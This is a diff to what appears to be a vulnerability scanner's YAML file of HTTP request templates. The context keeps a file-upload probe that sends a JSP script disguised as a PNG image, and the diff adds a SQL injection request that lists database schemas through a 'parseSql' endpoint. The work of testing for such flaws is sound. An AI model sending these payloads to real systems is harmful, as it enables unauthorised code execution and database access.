@@ -176,3 +176,10 @@ requests:
     Content-Type: "multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4"
     User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"
     Body: "------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nYWkc.png\r\n------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\nContent-Disposition: form-data; name=\"documentTitle\"\r\n\r\nblank\r\n------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"MYws72.jsp\"\r\nContent-Type: image/png\r\n\r\n<% out.println(\"111\");%>\r\n------WebKitFormBoundaryyfyhSCMs9cajzFD4--"
+  # parseSql SQL注入漏洞
+  parseSql:
+    URL: "online/cgreport/head/parseSql?sql=select%20schema_name%20from%20(information_schema.schemata)"
+    Method: "GET"
+    Content-Type: ""
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"
+    Body: 
